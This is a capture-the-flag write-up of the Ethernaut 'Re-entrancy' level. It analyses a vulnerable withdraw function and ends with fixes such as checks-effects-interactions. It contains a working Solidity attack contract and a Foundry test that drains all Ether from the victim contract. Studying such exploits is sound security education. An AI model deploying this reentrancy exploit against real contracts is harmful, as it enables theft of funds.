# Level 10 - Re-entrancy

## Objectives

- The goal of this level is for you to steal all the funds from the contract.

## Contract Overview

The `Reentrance` contract works like a bank. Contract users can send funds to any account that they specify. The owner of such an account can later withdraw the money. It is also possible to check the current balance of any account.

## Finding the weak spots

The weak spot is the `withdraw` function. It looks like:

```solidity
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
```

This function is taking some Ether in `_amount` and making sure that the balance of the user who initiated the function call should be greater than or equal to the amount.

It proceeds to send the requested `_amount` via a low-level `call` function that will use all the remaining gas to execute the operation. It is then making an external call to `msg.sender's` address. This is a big RED FLAG as this address can be controlled by our user since we are the `msg.sender`.

After the external call, it updates the balance of the `msg.sender` decreasing the amount. Since this is happening after the external call, we can exploit this behavior so that the function never reaches this line to update user balance.

We can see two big problems here!

- The contract uses the Solidity version < 8.0 and this mean that every math operation could suffer from underflow/overflow attacks. The contract also use `SafeMath` for `uint256` and for example in the `donate` function this problem does not exist. But in `withdraw` they do not use it when the function updates the final balance of the sender. The reason to not use it would be that the contract know for sure (under normal circumstances) that it cannot underflow because of the `if (balances[msg.sender] >= _amount)` check.
- The second problem is that `Reentrance` contract does not follow the [Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern).

In practice, what we should always do to follow Checks-Effects-Interactions Pattern (if applicable):

1. Perform all the checks needed
2. Perform all the state updates needed
3. Emit any event needed
4. Only after all these things perform the needed external call

By not following the Checks-Effects-Interactions Pattern and not using any Reentrancy Guard (like OpenZeppelin: ReentrancyGuard) this function is prone to a Reentrancy Attack.

## Potential attack scenario (hypothesis)

Attacker can create a malicious contract that will call the `donate()` and `withdraw()` functions of victim contract. Because `balances` are updated after making the `call`, attacker can re-enter the `withdraw` function, pass the `balances` check again and drain the contract balance to zero by repeating the process.

## Plan of the attack

1. Attacker creates the malicious contract that will call the `donate()` function with some initial Ether to deposit some balance into victim contract's account and than will call the `withdraw()` function using the same amount as donated balance to validate the if condition.
2. Attakcer will create a `receive()` function in the malicious contract so when the `withdraw()` function tries to send the attacker the Ether, he can reenter back into the function by calling it again.
3. Once this is done, the `withdraw()` function will try to execute the external call `msg.sender.call{value:_amount}("");` and send the `_amount` value to attacker contract's address.
4. Attacker contract will see the incoming transaction and the `receive()` function will handle it. `receive()` function will make a call to the vulnerable contract's `withdraw()` function. This will keep on repeating until the victim contract is drained.

## Malicious contract (ReentranceAttack.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance public reentranceContract;

    constructor(address _reentranceContract) public {
        reentranceContract = Reentrance(payable(_reentranceContract));
    }

    function attack() public payable {
        require(msg.value > 0, "donate something!");
        reentranceContract.donate{value: msg.value}(address(this));
        reentranceContract.withdraw(msg.value);
    }

    receive() external payable {
        reentranceContract.withdraw(msg.value);
    }
}
```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/10-Reentrance.t.sol))

```solidity
        ReentranceAttack reentranceAttack = new ReentranceAttack(
            address(reentranceContract)
        );
        emit log_named_uint(
            "Attackers's ether balance before attack",
            address(reentranceAttack).balance
        );

        emit log_named_uint(
            "Attacker contract balance in the victim contract before donation and withdrawal",
            reentranceContract.balanceOf(address(reentranceAttack))
        );

        emit log_string("Starting the exploit...");

        emit log_string("Starting the attack...");
        reentranceAttack.attack{value: 1 ether}();

        emit log_named_uint(
            "Attacker contract balance in the victim contract after donation and withdrawal",
            reentranceContract.balanceOf(address(reentranceAttack))
        );

        emit log_named_uint(
            "Victim contract ether balance after withdrawal",
            address(reentranceContract).balance
        );

        emit log_named_uint(
            "Attackers's ether balance after attack",
            address(reentranceAttack).balance
        );

        // Test assertion
        assertEq(address(reentranceContract).balance, 0);
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Reentrance.png)

## Recommendations

- Apply the checks-effects-interactions pattern. Making interactions before the state changes introduce an opening for the reentrancy attack.
- Use SafeMath for arithmetic operations.
- Use 0 address checks on functions that transfer funds.

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [Blog Stermi](https://stermi.xyz/blog/ethernaut-challenge-10-solution-reentancy)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Smart Contract Programmer YT - Ethernaut](https://www.youtube.com/playlist?list=PLO5VPQH6OWdWh5ehvlkFX-H3gRObKvSL6)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)
- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
